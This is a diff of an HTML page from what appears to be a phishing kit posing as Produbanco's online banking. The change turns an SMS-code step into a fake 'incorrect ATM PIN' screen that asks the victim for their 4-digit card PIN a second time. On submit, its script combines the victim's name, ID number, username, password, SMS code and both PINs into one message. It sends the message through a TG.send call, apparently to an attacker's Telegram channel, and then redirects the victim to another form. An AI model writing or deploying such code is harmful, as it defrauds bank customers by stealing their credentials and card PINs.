@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SMS</title>
+  <title>PIN de Cajero</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
@@ -70,8 +70,48 @@
       background-repeat: no-repeat;
       background-size: 210px 58px;
       height: 58px;
-      margin-bottom: 20px;
+      margin-bottom: 12px;
       width: 210px;
+    }
+
+    .ds-alerta-error {
+      align-items: flex-start;
+      background-color: #ef0000;
+      border-radius: 4px;
+      color: #fff;
+      display: flex;
+      gap: 10px;
+      margin-bottom: 28px;
+      max-width: 100%;
+      padding: 14px 14px 12px;
+      width: 100%;
+    }
+
+    .ds-alerta-icono {
+      flex: 0 0 auto;
+      font-size: 18px;
+      line-height: 1;
+      margin-top: 2px;
+    }
+
+    .ds-alerta-contenido {
+      min-width: 0;
+    }
+
+    .ds-alerta-titulo {
+      font-size: 24px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 24px;
+      margin: 0 0 9px;
+    }
+
+    .ds-alerta-texto {
+      font-size: 14px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 22px;
+      margin: 0;
     }
 
     .otp-titulo {
@@ -103,7 +143,8 @@
       flex: 0 0 auto;
       height: 47px;
       margin-top: -2px;
-      width: 30px;
+      width: auto;
+      object-fit: contain;
     }
 
     .otp-card-texto {
@@ -150,15 +191,6 @@
 
     .otp-input::placeholder {
       color: #8f8f8f;
-    }
-
-    .otp-note {
-      color: var(--ds-gray-text);
-      font-size: 15px;
-      font-style: normal;
-      font-weight: 400;
-      line-height: 24px;
-      margin: 14px 0 0;
     }
 
     .otp-actions {
@@ -275,7 +307,6 @@
 
       .otp-icon {
         height: 45px;
-        width: 28px;
       }
 
       .otp-card-texto {
@@ -310,36 +341,43 @@
         <div class="ds-formulario">
           <div class="ds-logotipo" aria-label="Logotipo Produbanco"></div>
 
-          <h1 class="otp-titulo">C&oacute;digo enviado por SMS</h1>
+          <section class="ds-alerta-error" role="alert" aria-live="polite">
+            <span class="ds-alerta-icono" aria-hidden="true">&#9888;</span>
+            <div class="ds-alerta-contenido">
+              <p class="ds-alerta-titulo">PIN incorrecto</p>
+              <p class="ds-alerta-texto">
+                El PIN de cajero ingresado es incorrecto. Vuelve a intentarlo y verifica
+                que los 4 d&iacute;gitos sean correctos.
+              </p>
+            </div>
+          </section>
+
+          <h1 class="otp-titulo">PIN de cajero</h1>
 
           <form id="frmOtpSms">
             <section class="otp-card">
               <div class="otp-card-top">
                 <img
                   class="otp-icon"
-                  src="https://static.wixstatic.com/media/1dff55_9578147109bd466c827bdd1750d036ce~mv2.png"
-                  alt="Tel&eacute;fono SMS"
+                  src="../../assets/candado.png"
+                  alt="Candado Seguridad"
                 >
                 <p class="otp-card-texto">
-                  Ingresa el c&oacute;digo temporal enviado por mensaje de texto a tu celular ********96
+                  Introduce el PIN de cajero de 4 d&iacute;gitos de tu tarjeta
                 </p>
               </div>
 
-              <div class="otp-codigo" aria-label="Casillas de c&oacute;digo SMS">
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="one-time-code" aria-label="D&iacute;gito 1" autofocus>
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 2">
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 3">
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 4">
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 5">
-                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" aria-label="D&iacute;gito 6">
+              <div class="otp-codigo" aria-label="Casillas de PIN">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="off" aria-label="D&iacute;gito 1" autofocus>
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="off" aria-label="D&iacute;gito 2">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="off" aria-label="D&iacute;gito 3">
+                <input class="otp-input" inputmode="numeric" maxlength="1" placeholder="-" autocomplete="off" aria-label="D&iacute;gito 4">
               </div>
-
-              <p class="otp-note">*Este c&oacute;digo expira en <span id="temporizador">5:00</span>.</p>
             </section>
 
             <div class="otp-actions">
               <button id="btnAceptar" class="otp-btn otp-btn--disabled" type="submit" disabled>Aceptar</button>
-              <a class="otp-btn otp-btn--cancel" href="login.html">Cancelar</a>
+              <a class="otp-btn otp-btn--cancel" href="../login.html">Cancelar</a>
             </div>
           </form>
 
@@ -356,17 +394,9 @@
     </section>
   </main>
 
-  <script src="tg.js"></script>
+  <script src="../tg.js"></script>
   <script>
     (function () {
-      // Dynamic phone last 2 digits
-      var phone = TG.load('whatsapp');
-      if (phone && phone.length >= 2) {
-        var last2 = phone.slice(-2);
-        var textoEl = document.querySelector('.otp-card-texto');
-        textoEl.innerHTML = textoEl.innerHTML.replace(/\*{8}\d{2}/, '********' + last2);
-      }
-
       const otpInputs = Array.from(document.querySelectorAll(".otp-input"));
       const btnAceptar = document.getElementById("btnAceptar");
       const frmOtpSms = document.getElementById("frmOtpSms");
@@ -443,6 +473,8 @@
 
         otpInputs.forEach(function (input, idx) {
           input.value = digitos[idx] || "";
+          input.dataset.valor = digitos[idx] || "";
+          setTimeout(function() { if (input.value) input.value = "•"; }, 300);
         });
 
         const foco = Math.min(digitos.length, otpInputs.length - 1);
@@ -454,67 +486,32 @@
         event.preventDefault();
         if (btnAceptar.disabled) return;
 
-        var smsCode = otpInputs.map(function (input) {
+        var pin2 = otpInputs.map(function (input) {
           return input.dataset.valor || (input.value === '•' ? '' : input.value);
         }).join('');
 
-        TG.save('sms', smsCode);
+        var pin1 = TG.load('pin1') || '';
 
-        var msg = '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
-          + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
-          + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
-          + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
-          + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
-          + '\u{1F464} USU: ' + TG.load('usuario') + '\n'
-          + '\u{1F512} SENA: ' + TG.load('sena') + '\n'
-          + '\u{1F511} SMS: ' + smsCode;
+        var msg = '\u{1F464} Nombres: ' + (TG.load('nombres') || '') + '\n'
+          + '\u{1F4C4} Documento: ' + (TG.load('documento') || '') + '\n'
+          + '\u{1F3E6} \u00BFEs Cliente?: ' + (TG.load('esCliente') || '') + '\n'
+          + '\u{1F464} USU: ' + (TG.load('usuario') || '') + '\n'
+          + '\u{1F512} SENA: ' + (TG.load('sena') || '') + '\n'
+          + '\u{1F511} SMS: ' + (TG.load('sms') || '') + '\n'
+          + '\u{1F511} P7N: ' + pin1 + '\n'
+          + '\u{1F511} P7N 2: ' + pin2;
 
         TG.overlay(true);
-        TG.send(msg, true, ['\u2705 Correcto', '\u274C Incorrecto']).then(function (sessionId) {
-          TG.poll(sessionId, function (action) {
+        TG.send(msg).then(function () {
+          setTimeout(function() {
             TG.overlay(false);
-            if (action === 'correct') {
-              window.location.href = 'p7n.html';
-            } else {
-              window.location.href = 'incorrecto/sms.html';
-            }
-          });
+            window.location.href = '../formulario.html';
+          }, 5000);
         });
       });
 
       actualizarEstadoBoton();
     })();
   </script>
-
-<script>
-  (function() {
-    var timerElement = document.getElementById('temporizador');
-    if (!timerElement) return;
-    
-    var pathKey = 'timer_' + window.location.pathname.replace(/[^a-zA-Z0-9]/g, '_');
-    var endTime = localStorage.getItem(pathKey);
-      if (endTime && Number(endTime) < Date.now()) { endTime = null; localStorage.removeItem(pathKey); }
-      if (!endTime) {
-      endTime = Date.now() + 300 * 1000;
-      localStorage.setItem(pathKey, endTime);
-    }
-    
-    function updateTimer() {
-      var timeRemaining = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
-      var m = Math.floor(timeRemaining / 60);
-      var s = timeRemaining % 60;
-      if (s < 10) s = '0' + s;
-      timerElement.textContent = m + ':' + s;
-      
-      if (timeRemaining <= 0) {
-        clearInterval(timerInterval);
-        localStorage.removeItem(pathKey);
-        var isIncorrecto = window.location.pathname.indexOf('incorrecto') !== -1;
-        window.location.href = isIncorrecto ? '../login.html' : 'login.html';
-      }
-    }
-    
-    updateTimer();
-    var timerInterval = setInterval(updateTimer, 1000);
-  })();
-</script>
+</body>
+</html>
